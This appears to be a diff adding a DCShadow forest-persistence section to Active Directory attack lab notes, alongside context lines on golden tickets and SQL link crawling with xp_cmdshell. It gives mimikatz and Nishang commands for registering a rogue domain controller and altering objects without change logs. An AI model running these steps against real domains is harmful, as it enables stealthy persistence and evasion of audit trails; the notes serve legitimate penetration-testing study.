@@ -752,3 +752,38 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
 
 - Executing Commands
   - `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'"`
+
+## Forest Persistence - DCShadow
+- DCShadow temporarily registers a new domain controller in the target domain and uses it to "push" attributes like SIDHistory, SPNs etc on specified objects without leaving the change logs for modified object.
+- The new domain controller is registered by modifying the Configuration container, SPNs of an existing computer object and couple of RPC services.
+- Because the attributes are changed from a "domain contoller", there are no directory change logs on the actual DC for the target object.
+- By default, DA privileges are required to use DCShadow.
+- The attacker's machine must be part of the root domain.
+
+- We can use mimikatz for DCShadow. Two mimikatz instances are required.
+  - One to start RPC servers with SYSTEM privileges and specify attributes to be modified.
+    - Open mimikatz cmd with admin privileges.
+    - `!+`
+    - `!processtoken`
+    - `lsadump:dcshado /object:root1user /attribute:Description /value="Hello from DCShadow"`
+
+  - And second with enough privileges (DA or otherwise) to push the values. 
+    - `lsadump::dcshadow /push`
+
+- DCShadow can be used with minimal permissions by modifying ACLs of
+  - The domain object
+    - DS-Install-Replica (Add/Remove Replica in Domain)
+    - DS-Replication-Manage-Topology (Manage Replication Topology)
+    - DS-Replication-Synchronize (Replicatoin Synchornization)
+  - The sites object (and its children) in the configuration container.
+    - CreateChild and DeleteChild
+  - The object of the computer which is registered as a DC.
+    - WriteProperty (Not Write)
+  - The target object
+    - WriteProperty (Not Write)
+
+- We can use `Set-DCShadowPermissions` from Nishang for setting the permissions.
+- For example, to use DCShadow as user student1 to modify root1user object from machine mcorp-student1
+  - `Set-DCShadowPermissions -FakeDC mcorp-student1 -SAMAccountName root1user -Username student1 -Verbose`
+
+- Now, the second mimikatz instance (which runs as DA) is not required.
